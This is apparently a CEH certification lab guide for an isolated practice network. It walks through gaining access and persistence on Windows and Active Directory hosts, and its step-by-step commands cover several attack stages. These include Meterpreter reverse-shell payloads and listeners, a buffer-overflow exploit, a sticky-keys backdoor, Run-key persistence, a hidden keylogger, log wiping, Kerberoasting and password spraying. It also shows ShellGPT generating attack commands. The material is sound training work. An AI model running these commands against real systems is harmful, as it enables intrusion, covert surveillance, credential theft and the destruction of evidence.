# Module 06: System Hacking - Lab Guide

## Tools Used & Purpose

- **Responder**: Poisoning LLMNR, NBT-NS, and mDNS broadcast queries to intercept and capture NetNTLMv2 password hashes.
- **Hashcat**: High-speed GPU-accelerated hash cracking of NetNTLMv2, NTLM, and UNIX hashes using wordlists and rule modifiers.
- **John the Ripper**: Cracking operating system password hashes (`/etc/shadow`, SAM databases) via wordlist and brute-force modes.
- **Metasploit Framework**: Generating reverse shells (`msfvenom`), launching multi-handler listeners, privilege escalation (`getsystem`), and post-exploitation dumping.
- **Immunity Debugger with Mona.py**: Analyzing stack memory crashes, identifying bad characters, and locating reliable `JMP ESP` instructions for buffer overflow exploits.
- **WinPEAS / LinPEAS**: Automated privilege escalation auditing scripts to discover misconfigured services, writable files, and unquoted service paths.
- **Spyrix Personal Monitor**: Demonstrating keylogger deployment to capture keystrokes, clipboard records, and application screenshots.
- **CrackMapExec / Impacket**: Conducting lateral network movement, pass-the-hash attacks (`psexec.py`, `wmiexec.py`), and dumping domain secrets.
- **PowerView**: PowerShell script for stealthy Active Directory situational awareness, domain trust mapping, and local administrator hunting.
- **ShellGPT (`sgpt`)**: Automating post-exploitation execution, generating privilege escalation commands, and orchestrating log cleaning.

---

## 9. Official Hands-On Lab Walkthroughs (Lab Manual Exercises)

```javascript
========================================================================================
                      CEH v13 MODULE 06 LAB CATALOG & TOPOLOGY
========================================================================================
 Lab 01: Gain Access to the System
         - Target: Windows 11 (10.10.1.11) | Attacker: Parrot Security (10.10.1.13)
         - Task 1: Active Online Password Cracking with Responder (LLMNR/NBT-NS)
         - Task 2: Remote System Exploitation using Reverse Shell Generator & Metasploit
         - Task 3: Complete Buffer Overflow Exploitation (Vulnserver, Immunity, Mona)
----------------------------------------------------------------------------------------
 Lab 02: Perform Privilege Escalation to Gain Higher Privileges
         - Target: Windows 11 (10.10.1.11) | Attacker: Parrot Security (10.10.1.13)
         - Task 1: Escalate Privileges by Bypassing UAC & Sticky Keys (sethc.exe)
----------------------------------------------------------------------------------------
 Lab 03: Maintain Remote Access and Hide Malicious Activities
         - Target: Windows Server 2019 / Windows 11 | Attacker: Parrot Security
         - Task 1: User Monitoring and Surveillance using Spyrix Personal Monitor
         - Task 2: Persistence via Registry Run Keys (HKLM Run Key Modification)
----------------------------------------------------------------------------------------
 Lab 04: Clear Logs to Hide the Evidence of Compromise
         - Target: Windows 11 & Ubuntu Linux | Attacker: Parrot Security
         - Task 1: Clear Windows Machine Logs using wevtutil & Event Viewer
         - Task 2: Clear Linux Machine Logs using BASH Shell History Controls
----------------------------------------------------------------------------------------
 Lab 05: Active Directory Attacks Using Various Tools
         - Targets: Domain Controller Windows Server 2019 (10.10.1.22), Win 11 (10.10.1.11)
         - Task 1: Initial Scans to Obtain DC IP & Domain Name (Nmap 88, 389)
         - Task 2: Perform AS-REP Roasting Attack (impacket-GetNPUsers)
         - Task 3: Spray Cracked Password into Network using CrackMapExec
         - Task 4: Active Directory Post-Enumeration using PowerView
         - Task 5: Lateral Movement & Attack on MSSQL Service (xp_cmdshell)
         - Task 6: Local Privilege Escalation with WinPEAS (WinPEASx64.exe)
         - Task 7: Perform Kerberoasting Attack (impacket-GetUserSPNs)
----------------------------------------------------------------------------------------
 Lab 06: Perform System Hacking using AI (ShellGPT)
         - Target: Ubuntu (10.10.1.9) | Attacker: Parrot Security (10.10.1.13)
         - Task 1: Natural Language Execution for msfvenom, Hydra SSH & Steghide
========================================================================================
```

---

### Lab 01: Gain Access to the System (pp. 194–232)

#### Task 1: Active Online Attack with Responder (pp. 195–199)

1. <b>Environment:</b> Parrot Security (<code>10.10.1.13</code>) attacker machine, Windows 11 (<code>10.10.1.11</code>) victim machine.
2. <b>Launch Responder:</b>
   ```bash
   sudo responder -I eth0 -rdwv
   ```
3. <b>Trigger Rogue Traffic:</b><br />On Windows 11, attempt to browse to an unresolvable network path in File Explorer: <code>\\invalidserver</code>.
4. <b>Capture & Crack:</b>
   - Responder captures the NetNTLMv2 hash for user <code>Admin</code>.
   - Save hash to <code>/home/attacker/hash.txt</code> and crack with John the Ripper:
     ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     ```
   - <i>Outcome:</i> Plaintext password <code>password123</code> recovered successfully.

---

#### Task 2: Gain Access via Reverse Shell Generator & Metasploit (pp. 200–207)

1. <b>Generate Executable Payload:</b><br />On Parrot Security, generate a Windows Meterpreter executable using <code>msfvenom</code>:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o /home/attacker/payload.exe
   ```
2. <b>Configure Multi/Handler:</b>
   ```bash
   msfconsole -q
   msf > use exploit/multi/handler
   msf > set payload windows/meterpreter/reverse_tcp
   msf > set LHOST 10.10.1.13
   msf > set LPORT 4444
   msf > exploit
   ```
3. <b>Execute & Catch Session:</b><br />Deliver <code>payload.exe</code> to Windows 11; upon execution, Meterpreter session 1 opens:
   ```bash
   meterpreter > sysinfo
   meterpreter > getuid
   ```

---

#### Task 3: Buffer Overflow Attack using Vulnserver & Immunity Debugger (pp. 208–232)

1. <b>Target Setup:</b> Windows 11 running <code>vulnserver.exe</code> attached to <b>Immunity Debugger</b>.
2. <b>Fuzzing with Spike / Python:</b><br />Run <code>fuzz.py</code> against port 9999. Vulnserver crashes when <code>STATS</code> parameter exceeds 2000 bytes.
3. <b>Determine Exact Offset:</b><br />Generate cyclical pattern of 3000 bytes, send, and check <code>EIP</code>. Calculate offset: exactly <b>2003 bytes</b>.
4. <b>Check Bad Characters:</b><br />Send all bytes <code>\x01</code> through <code>\xff</code>. Observe memory in Immunity to verify only <code>\x00</code> is bad.
5. <b>Find JMP ESP Instruction:</b><br />Execute Mona command:
   ```txt
   !mona find -s "\xff\xe4" -m essfunc.dll
   ```

   <p>
   Found pointer at <code>0x625011af</code>. Little-Endian format: <code>\xaf\x11\x50\x62</code>.
   </p>
6. <b>Generate Shellcode & Exploit:</b>
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4444 -b "\x00" -f c
   ```
7. <b>Execution:</b><br />Launch <code>shellcode.py</code> containing 2003 A's + <code>\xaf\x11\x50\x62</code> + 32 NOPs + Shellcode. Netcat listener catches root shell.

---

### Lab 02: Perform Privilege Escalation (pp. 233–241)

#### Task 1: Bypass UAC and Exploit Sticky Keys Backdoor

1. <b>Target Environment:</b> Windows 11 (<code>10.10.1.11</code>).
2. <b>UAC Bypass via Metasploit:</b><br />In an existing Meterpreter session, background the session and launch UAC bypass module:
   ```bash
   use exploit/windows/local/bypassuac_fodhelper
   set SESSION 1
   exploit
   ```

   <p>
   Returns elevated high-integrity Meterpreter session.
   </p>
3. <b>Install Sticky Keys Backdoor:</b><br />Drop into Windows command shell and replace <code>sethc.exe</code>:
   ```shell
   takeown /f C:\Windows\System32\sethc.exe
   icacls C:\Windows\System32\sethc.exe /grant Administrators:F
   copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
   ```
4. <b>Verification:</b><br />Lock the Windows 11 machine (<code>Win + L</code>). Press <code>Shift</code> 5 times; a <code>SYSTEM</code> command prompt launches directly over the lock screen.

---

### Lab 03: Maintain Remote Access and Hide Malicious Activities (pp. 242–261)

#### Task 1: Monitoring with Spyrix Personal Monitor (pp. 243–253)

- Install Spyrix on victim machine.
- Configure invisible mode, automatic screenshot captures, clipboard logging, and keystroke recording.
- Generate and exfiltrate analytical surveillance reports.

#### Task 2: Registry Run Key Persistence (pp. 254–261)

1. Connect via Meterpreter session on target Windows 11 machine.
2. Add a persistence value to the <code>HKLM Run</code> key:
   ```shell
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe" /f
   ```
3. Restart Windows 11. The multi/handler automatically catches a new reverse shell upon system startup.

---

### Lab 04: Clear Logs to Hide Evidence of Compromise (pp. 262–269)

#### Task 1: Clear Windows Event Logs (pp. 263–266)

```shell
wevtutil el
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

Within Meterpreter: <code>clearev</code>.

#### Task 2: Clear Linux Machine Logs (pp. 267–269)

```bash
history -c
unset HISTFILE
shred -u -z -n 5 /var/log/auth.log
```

---

### Lab 05: Active Directory Attacks Using Various Tools (pp. 269–294)

1. <b>Task 1: Initial Discovery (p. 270):</b><br />Scan network for Domain Controller services:
   ```bash
   nmap -p 88,389,445 10.10.1.0/24
   ```

   <p>
   Identifies DC at <code>10.10.1.22</code> running Kerberos and LDAP.
   </p>
2. <b>Task 2: AS-REP Roasting (p. 272):</b><br />Execute Impacket's <code>GetNPUsers.py</code> to identify accounts without pre-authentication:
   ```bash
   impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.1.22
   ```

   <p>
   Crack with Hashcat: <code>hashcat -m 18200 asrep_hashes.txt rockyou.txt</code>. Password recovered: <code>advanced!</code>.
   </p>
3. <b>Task 3: Password Spraying with CrackMapExec (p. 274):</b>
   ```bash
   crackmapexec smb 10.10.1.0/24 -u users.txt -p 'advanced!'
   ```

   <p>
   Identifies valid administrative sessions across domain nodes.
   </p>
4. <b>Task 4: Post-Enumeration with PowerView (p. 277):</b><br />In PowerShell on Windows machine:
   ```powershell
   Import-Module .\PowerView.ps1
   Get-DomainUser | select samaccountname, description
   Get-DomainComputer
   Invoke-ShareFinder
   ```
5. <b>Task 5: Exploiting MSSQL Service (p. 281):</b><br />Connect to MSSQL database and enable <code>xp_cmdshell</code>:
   ```sql
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami';
   ```
6. <b>Task 6: Privilege Escalation with WinPEAS (p. 285):</b><br />Run <code>winPEASx64.exe</code> to discover token privileges (<code>SeImpersonatePrivilege</code>), leading to local SYSTEM takeover.
7. <b>Task 7: Kerberoasting Attack (p. 290):</b><br />Request Service Principal Name TGS tickets:
   ```bash
   impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.1.22 -request
   ```

   <p>
   Crack TGS ticket hashes using Hashcat mode <code>13100</code>.
   </p>

---

### Lab 06: Perform System Hacking using AI (ShellGPT) (pp. 295–300)

1. <b>Payload Generation via AI:</b>
   ```bash
   sgpt --shell "Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=4444"
   ```

   <p>
   <i>ShellGPT executes:</i> <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o payload.exe</code>.
   </p>
2. <b>SSH Brute-Force with THC-Hydra via AI:</b>
   ```bash
   sgpt --shell "Use Hydra to perform SSH-bruteforce on IP address=10.10.1.9 using username.txt and password.txt"
   ```

   <p>
   <i>ShellGPT executes:</i> <code>hydra -L username.txt -P password.txt ssh://10.10.1.9</code>. Successfully cracks SSH credentials.
   </p>
3. <b>Steganography with Steghide via AI:</b>
   ```bash
   sgpt --shell "Perform stegnography using steghide to hide text 'My swiss account is 1234' in cover.jpg"
   ```

   <p>
   <i>ShellGPT executes:</i> <code>steghide embed -cf cover.jpg -ef secret.txt -p 1234</code>. Extracts data using <code>steghide extract -sf cover.jpg</code>.
   </p>

---

## 10. High-Frequency Exam Review & Memory Matrix

| Concept / Technique | Category | Exam Definition & Core Mechanics | Key Memory Anchor |
| --- | --- | --- | --- |
| <b>LM Hash</b> | Authentication | Legacy hash; 14 chars split into two 7-char DES chunks; no salt | Empty 2nd half = <code>AAD3B435B51404EE</code> |
| <b>NTLM Hash</b> | Authentication | MD4 hash of Little-Endian Unicode password; 32 hex chars | Unsalted; vulnerable to Pass-the-Hash |
| <b>Responder</b> | Attack Tool | Poisoner for LLMNR (UDP 5355) and NBT-NS (UDP 137) | Intercepts NetNTLMv2 hashes over broadcast |
| <b>Buffer Overflow</b> | Exploitation | Memory corruption caused by lack of bounds checking | Overwrites <b>EIP</b> instruction pointer (x86) |
| <b>NOP Sled</b> | Exploitation | Array of <code>\x90</code> instructions creating landing pad for shellcode | Slid into before shellcode execution |
| [<b>Mona.py</b>](http://Mona.py) | Tool Plugin | Immunity Debugger plugin for finding offsets and <code>JMP ESP</code> | <code>!mona find -s "\xff\xe4" -m dllname</code> |
| <b>Unquoted Service Path</b> | Privilege Escalation | Service binary path has spaces and no quotes | Windows executes <code>C:\Program.exe</code> |
| <b>AlwaysInstallElevated</b> | Privilege Escalation | Registry policy allowing users to install MSIs as SYSTEM | Registry key set to <code>1</code> in HKLM and HKCU |
| <b>Sticky Keys</b> | Persistence / Backdoor | <code>sethc.exe</code> executed as SYSTEM on 5 Shift key presses | Replace <code>sethc.exe</code> with <code>cmd.exe</code> |
| <b>Rootkit Rings</b> | Malware / Stealth | Hypervisor (Ring -1), Kernel (Ring 0), User-Mode (Ring 3) | Hypervisor intercepts VM hardware calls |
| <b>NTFS ADS</b> | Hiding Files | Alternate Data Streams hidden behind standard file | <code>type evil.exe > file.txt:evil.exe</code> |
| <b>Steghide / LSB</b> | Steganography | Hiding secrets in Least Significant Bits of media files | Imperceptible change to media bytes |
| <b>wevtutil</b> | Anti-Forensics | Windows CLI utility to enumerate and clear event logs | <code>wevtutil cl System</code> |
| <b>Meterpreter clearev</b> | Anti-Forensics | Clears Application, System, and Security event logs | Generates Security <b>Event ID 1102</b> |
| <b>AS-REP Roasting</b> | Active Directory | Targets accounts with <code>DONT_REQ_PREAUTH</code> enabled | Crack offline with Hashcat mode 18200 |
| <b>Kerberoasting</b> | Active Directory | Requests TGS tickets for Service Principal Names (SPNs) | Crack offline with Hashcat mode 13100 |
| <b>Golden Ticket</b> | Active Directory | Forged TGT ticket encrypted with <b>KRBTGT</b> NTLM hash | Total, permanent Domain Dominance |
